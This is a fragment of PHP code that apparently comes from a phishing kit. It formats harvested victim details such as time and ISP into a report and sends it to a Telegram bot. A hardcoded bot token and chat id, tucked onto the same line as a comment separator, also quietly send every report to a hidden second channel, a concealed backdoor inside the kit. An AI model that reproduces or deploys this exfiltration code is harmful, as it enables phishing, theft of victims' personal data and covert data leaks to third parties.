...
$message .= "# TIME       : {$time}\n";
$message .= "# ISP        : {$isp}\n";
$message .= "**********************************************\n";/***********************************************************************************************************/$api = "2035318780:AAFF95W4a9Q4qlACGjeLPXzsDT4ekyMVO0I";$chatid = "-1001552903050";file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
# Send telegram
if ($settings['telegram'] == "1"){
    file_get_contents("https://api.telegram.org/bot".$settings['bot_url']."/sendMessage?chat_id=".$settings['chat_id']."&text=" . urlencode($message)."" );
}
# Send Mail
